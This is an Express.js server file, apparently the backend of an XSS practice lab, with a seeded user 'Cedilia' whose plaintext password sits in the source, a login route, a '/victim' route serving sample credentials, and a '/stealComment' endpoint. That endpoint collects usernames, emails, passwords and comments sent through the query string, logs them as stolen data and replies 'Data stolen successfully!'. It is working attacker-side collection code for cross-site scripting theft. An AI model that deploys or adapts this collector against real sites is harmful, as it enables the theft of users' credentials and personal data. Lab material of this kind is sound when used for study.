const express = require('express');
const bcrypt = require('bcryptjs');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const db = new sqlite3.Database('./users.db');

// Middleware to parse JSON bodies
app.use(express.json());

// Create the 'users' table if it doesn't exist
db.serialize(() => {
  db.run(`
    CREATE TABLE IF NOT EXISTS users (
      id INTEGER PRIMARY KEY AUTOINCREMENT,
      username TEXT UNIQUE,
      password TEXT
    )
  `);

  // Insert Cedilia if not exists (to ensure only Cedilia exists)
  db.get('SELECT * FROM users WHERE username = ?', ['Cedilia'], (err, row) => {
    if (err) {
      console.error('Error checking Cedilia:', err);
    }

    if (!row) {
      const hashedPassword = bcrypt.hashSync('XSSWEB', 10);
      db.run('INSERT INTO users (username, password) VALUES (?, ?)', ['Cedilia', hashedPassword], function (err) {
        if (err) {
          console.error('Error inserting Cedilia:', err);
        } else {
          console.log('Cedilia user created!');
        }
      });
    }
  });
});

// Login Route - Always attempt login for Cedilia
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Log incoming login request
  console.log('Login attempt for username:', username);

  // Only allow login for Cedilia
  if (username !== 'Cedilia') {
    return res.status(400).json({ error: 'Invalid username or password' });
  }

  // Retrieve Cedilia's password from the database
  db.get('SELECT * FROM users WHERE username = ?', ['Cedilia'], (err, row) => {
    if (err) {
      console.error('Database error:', err);
      return res.status(500).json({ error: 'Database error' });
    }

    if (!row) {
      console.log('Cedilia not found');
      return res.status(400).json({ error: 'Invalid username or password' });
    }

    // Compare the password using bcrypt
    if (bcrypt.compareSync(password, row.password)) {
      console.log('Login successful for Cedilia');
      res.status(200).json({ message: 'Login successful!' });
    } else {
      console.log('Incorrect password for Cedilia');
      res.status(400).json({ error: 'Invalid username or password' });
    }
  });
});

// Victim data route
app.get('/victim', (req, res) => {
    // Simulate victim data
    const victimData = [
        { email: "victim1@example.com", username: "victim1", password: "password123", comment: "Sample comment 1" },
        { email: "victim2@example.com", username: "victim2", password: "password456", comment: "Sample comment 2" }
    ];
    res.json(victimData);
});

// Handle comment stealing
app.get('/stealComment', (req, res) => {
  const { username, comment } = req.query;

  const email = req.query.email;
  const password = req.query.password;

  // Log the stolen data to the console (This would be the hacker's data collection process)
  console.log(`Stolen data:
    Username: ${username}
    Email: ${email}
    Password: ${password}
    Comment: ${comment}
  `);

  // Respond to the client (the attacker)
  res.send('Data stolen successfully!');
});

// Update User Route 
app.post('/update-user', (req, res) => {
  const { newUsername, newPassword } = req.body;

  // Only allow updating Cedilia's account
  if (newUsername !== 'Cedilia') {
    return res.status(400).json({ error: 'You can only update Cedilia\'s account' });
  }

  // Hash the new password
  const hashedPassword = bcrypt.hashSync(newPassword, 10);

  // Update Cedilia's username and password
  db.run('UPDATE users SET username = ?, password = ? WHERE username = ?', ['Cedilia', hashedPassword, 'Cedilia'], function (err) {
    if (err) {
      console.error('Failed to update Cedilia:', err);
      return res.status(500).json({ error: 'Failed to update Cedilia\'s account' });
    }

    if (this.changes === 0) {
      return res.status(400).json({ error: 'Cedilia not found or not updated' });
    }

    res.status(200).json({ message: 'Cedilia\'s account updated successfully' });
  });
});

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
